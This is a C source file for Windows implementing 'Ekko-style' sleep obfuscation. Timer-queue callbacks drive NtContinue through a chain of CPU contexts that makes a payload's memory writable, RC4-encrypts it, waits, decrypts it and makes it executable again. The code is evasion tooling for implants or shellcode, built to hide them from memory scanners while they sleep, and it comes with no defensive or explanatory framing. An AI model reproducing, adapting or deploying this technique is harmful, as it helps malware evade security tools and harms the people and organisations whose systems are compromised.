#include <windows.h>
#include <stdio.h>

// Ekko-style Sleep Obfuscation
// Uses Timer Queues and ROP chains via NtContinue to change memory protections, sleep, and restore.

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(struct USTRING* Img, struct USTRING* Key);
typedef NTSTATUS(NTAPI* fnNtContinue)(PCONTEXT ContextRecord, BOOLEAN TestAlert);

struct USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
};

void EkkoSleep(DWORD sleepTimeMs, PVOID pPayloadBase, SIZE_T payloadSize, PBYTE rc4Key) {
    HANDLE hTimerQueue = CreateTimerQueue();
    HANDLE hNewTimer = NULL;
    
    CONTEXT CtxThread = { 0 };
    CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopDelay = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRX = { 0 };
    CONTEXT RopSetEvt = { 0 };

    HANDLE hEvent = CreateEventW(0, 0, 0, 0);
    
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");
    fnNtContinue NtContinue = (fnNtContinue)GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue");

    USTRING Data = { 0 };
    USTRING Key = { 0 };
    
    Data.Buffer = pPayloadBase;
    Data.Length = (DWORD)payloadSize;
    Data.MaximumLength = (DWORD)payloadSize;
    
    Key.Buffer = rc4Key;
    Key.Length = 16;
    Key.MaximumLength = 16;

    DWORD oldProtect = 0;

    CtxThread.ContextFlags = CONTEXT_FULL;
    GetThreadContext(GetCurrentThread(), &CtxThread);

    // Setup ROP Contexts
    RopProtRW.ContextFlags = CONTEXT_FULL;
    RopMemEnc.ContextFlags = CONTEXT_FULL;
    RopDelay.ContextFlags = CONTEXT_FULL;
    RopMemDec.ContextFlags = CONTEXT_FULL;
    RopProtRX.ContextFlags = CONTEXT_FULL;
    RopSetEvt.ContextFlags = CONTEXT_FULL;

    // 1. VirtualProtect to RW
    RopProtRW.Rsp = CtxThread.Rsp - 0x2000;
    RopProtRW.Rip = (DWORD64)VirtualProtect;
    RopProtRW.Rcx = (DWORD64)pPayloadBase;
    RopProtRW.Rdx = (DWORD64)payloadSize;
    RopProtRW.R8  = PAGE_READWRITE;
    RopProtRW.R9  = (DWORD64)&oldProtect;

    // 2. Encrypt (SystemFunction032)
    RopMemEnc.Rsp = CtxThread.Rsp - 0x2000;
    RopMemEnc.Rip = (DWORD64)SystemFunction032;
    RopMemEnc.Rcx = (DWORD64)&Data;
    RopMemEnc.Rdx = (DWORD64)&Key;

    // 3. Sleep (WaitForSingleObject)
    RopDelay.Rsp = CtxThread.Rsp - 0x2000;
    RopDelay.Rip = (DWORD64)WaitForSingleObject;
    RopDelay.Rcx = (DWORD64)GetCurrentProcess();
    RopDelay.Rdx = sleepTimeMs;

    // 4. Decrypt (SystemFunction032)
    RopMemDec.Rsp = CtxThread.Rsp - 0x2000;
    RopMemDec.Rip = (DWORD64)SystemFunction032;
    RopMemDec.Rcx = (DWORD64)&Data;
    RopMemDec.Rdx = (DWORD64)&Key;

    // 5. VirtualProtect to RX
    RopProtRX.Rsp = CtxThread.Rsp - 0x2000;
    RopProtRX.Rip = (DWORD64)VirtualProtect;
    RopProtRX.Rcx = (DWORD64)pPayloadBase;
    RopProtRX.Rdx = (DWORD64)payloadSize;
    RopProtRX.R8  = PAGE_EXECUTE_READ;
    RopProtRX.R9  = (DWORD64)&oldProtect;

    // 6. SetEvent to signal completion
    RopSetEvt.Rsp = CtxThread.Rsp - 0x2000;
    RopSetEvt.Rip = (DWORD64)SetEvent;
    RopSetEvt.Rcx = (DWORD64)hEvent;

    // Queue timers to execute the contexts via NtContinue
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 400 + sleepTimeMs, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 500 + sleepTimeMs, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 600 + sleepTimeMs, 0, WT_EXECUTEINTIMERTHREAD);

    // Wait for the chain to finish
    WaitForSingleObject(hEvent, INFINITE);

    DeleteTimerQueue(hTimerQueue);
    CloseHandle(hEvent);
}
